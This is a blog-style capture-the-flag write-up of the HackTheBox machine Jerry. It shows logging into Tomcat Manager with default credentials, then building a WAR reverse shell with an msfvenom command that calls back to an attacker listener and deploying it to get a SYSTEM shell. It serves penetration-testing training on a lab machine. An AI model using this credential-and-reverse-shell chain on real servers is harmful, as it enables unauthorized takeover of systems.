+++
date = '2026-05-19T00:00:00-03:00'
draft = false
title = 'HTB: Jerry - OSCP Prep Write-up'
tags = ['htb', 'oscp', 'lain-kusanagi', 'write-up', 'windows', 'web', 'tomcat', 'default-creds', 'war', 'msfvenom']
description = 'Write-up for the HackTheBox machine Jerry - using default Tomcat credentials and a malicious WAR file to land directly as SYSTEM.'
ShowToc = true
TocOpen = false
[cover]
image = 'images/htb-jerry/cover.png'
+++

Default credentials. WAR file upload. SYSTEM. Jerry is short, but it covers a technique that shows up on real engagements more often than you would expect.

## Machine info

| | |
|---|---|
| **Name** | Jerry |
| **Platform** | HackTheBox |
| **OS** | Windows |
| **Difficulty** | Easy |

## TL;DR

- Apache Tomcat 7.0.88 on port 8080 with **default credentials** (`tomcat:s3cret`)
- Uploaded a malicious **WAR reverse shell** via the Tomcat Manager
- Shell landed directly as **NT AUTHORITY\SYSTEM** - both flags in a single session

---

## Recon

### Nmap

```bash
nmap -sV -sC -Pn 10.129.34.208
```

![Nmap output: port 8080 open, Apache Tomcat/Coyote JSP engine 1.1, version 7.0.88](/images/htb-jerry/nmap-scan.png)

Single open port: **8080**, Apache Tomcat 7.0.88. The Tomcat Manager is the logical first target.

---

## Enumeration

### Trying default credentials

Tomcat Manager pops an HTTP Basic Auth prompt. Before reaching for any wordlist, I checked the standard default credential list:

![msfconsole creds search tomcat output - tomcat:s3cret row highlighted](/images/htb-jerry/creds-search.png)

`tomcat:s3cret` worked on the first attempt.

![Tomcat Manager page with application list and WAR file deploy section](/images/htb-jerry/tomcat-manager.png)

The Manager exposes a WAR deployment interface - that is the path to code execution.

---

## Foothold

### WAR reverse shell via Tomcat Manager

Generate a reverse shell payload as a WAR archive:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f war -o rev.war
```

![msfvenom output showing rev.war saved, 2582 bytes](/images/htb-jerry/msfvenom-war.png)

Upload `rev.war` through the Manager UI, set up a netcat listener, then browse to `/rev` to trigger it.

![nc -nlvp 443 receiving connection, Microsoft Windows 6.3.9600, C:\apache-tomcat-7.0.88> prompt](/images/htb-jerry/shell.png)

Shell received. Tomcat runs as SYSTEM on this machine, so privilege escalation is not needed.

![type "2 for the price of 1.txt" showing user.txt and root.txt hashes on the same flag file](/images/htb-jerry/flags.png)

HTB named the file "2 for the price of 1" for a reason - both flags are right there.

---

## Takeaways (for OSCP)

- **Always try default credentials first.** Tomcat ships with a known set and administrators routinely leave them unchanged. A one-minute check saves hours of unnecessary brute-forcing.
- **WAR deployment is a reliable and straightforward Tomcat RCE path.** Manager access plus msfvenom is a repeatable pattern worth having memorized.
- **Check what account the service runs as before starting privesc.** Tomcat on Windows often runs as SYSTEM or a domain service account. Knowing this upfront saves time.

## References

- [HackTheBox - Jerry](https://app.hackthebox.com/machines/Jerry)
- [Apache Tomcat Default Credentials](https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown)
- [Tomcat Manager WAR upload RCE - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/apache-tomcat)
- Lain Kusanagi list (OSCP prep)
